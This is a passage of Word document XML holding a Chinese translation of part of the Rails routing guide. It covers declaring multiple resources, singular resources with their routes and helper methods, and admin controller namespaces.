          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_url</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Helper (例如 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>photos_url</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) 后者将会返回包含了主机，端口等信息的绝对路径地址。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41303E2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因为路由器可以使用 HTTP 动词 加上一个 URL 来匹配受到的请求，所以四个不同的 URL 可以组合出7种不同的行为。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72CCB807"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2.4 同时定义多个 Resource</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BCD34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如果你想在路由表中建立多个 Resource， 你可以把他们写到一行里面去，这样只需要调用一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>resources</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，同时为你节约点输入时间：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4296"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="2875890F" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="11028358" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1433360654"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>resources :photos, :books, :videos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4017BFD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它和下面这样写的效果是一样的：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2256"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="696AFF4C" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A28830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resources :photos</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F38C75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resources :books</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="304530B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resources :videos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="48D0FB7F"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2.5 单件 Resources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="144D1EC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有时候，你并不需要一个能够根据ID查询个体的 resource 。例如，你可能会想用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/profile</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来显示当前登录用户的简介，这时候你可以用 map </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/profile</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/profile/:id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) 一个单体化的 Resource 来匹配 show 行为。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3936"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="7B018F0B" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6DA200B2" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="837694045"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match "profile"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "users#show"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="05D985D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或者这样来声明一个 Resourceful 的资源：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2376"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3CE1A4FF" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="04F16CA5" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="842358575"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>resource :geocoder</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3783A72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它会为你的应用建立六个不同的 routes ，都将匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Geocoders</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制器:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1415"/>
        <w:gridCol w:w="1896"/>
        <w:gridCol w:w="1056"/>
        <w:gridCol w:w="4155"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="62523A94" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="50B12956"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HTTP Verb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="378BA6BA"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Path </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03880949"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action </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14D8F596"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used for </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="786A1318" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="079E3DB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5CB2A2A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/geocoder/new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C1675D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new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14B4D55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return an HTML form for creating the geocoder </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="1A4A9A40" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="186B766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POST </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6DAA42D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/geocoder </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="37D2B10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create </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28DF519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create the new geocoder </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="16D2FAD8" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3B0C552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632B931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/geocoder </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19B6654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show </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0557DD5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display the one and only geocoder resource </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="028ACE7C" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="36EDF8B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626AC8C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/geocoder/edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="35A4C39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edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0CF0877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return an HTML form for editing the geocoder </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6DC98DF6" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2220192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PATCH/PUT </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4470D5A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/geocoder </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="37C1C0F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update </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F146DE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update the one and only geocoder resource </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6575F98B" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6857FC0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DELETE </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="126D1E9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/geocoder </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7F3A821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destroy </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="029D3E9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delete the geocoder resource </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="79F3448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因为你可能要在路由中同时使用单数 (</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/account</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) 和 复数 （</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/accounts/45</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>） 而想要对应同一个控制器，所以单件 Resource 命令也是对应复数的控制器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0498E9A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一个 单件 Resourceful 路由生成这些 Helper 方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79477F41" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>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new_geocoder_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 返回 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/geocoder/new</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E9E28A" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>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edit_geocoder_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 返回 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/geocoder/edit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15A4A0C7" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>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geocoder_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 返回 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/geocoder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B8A13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同复数的 resources 命令一样，以 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_url</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 结尾的 Hepler 将会包括主机名，端口值和其他的相关路径前缀。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310CF021"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2.6 控制器、命名空间(Namespaces),和路由</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5864EA3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有时，你可以想要把一些同类的控制器组织到一个命名空间下面去，其中最常见的就是我们会把一组管理功能的控制器放到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Admin::</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 下，然后把这个空间下的控制器都放在 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/controllers/admin</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录下，并且统一在路由中配置：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3936"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="1AF27F11" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="327A441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namespace :admin</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1792960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:posts, :comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D92271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64015D4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这样将会为每一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>comments</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法建立一个路由规则，对于 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Admin::PostsController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>， Rails 会建立这些路由表规则：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1474"/>
        <w:gridCol w:w="2736"/>
        <w:gridCol w:w="1056"/>
        <w:gridCol w:w="3216"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0ED61C5A" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="23637BA7"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HTTP Verb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
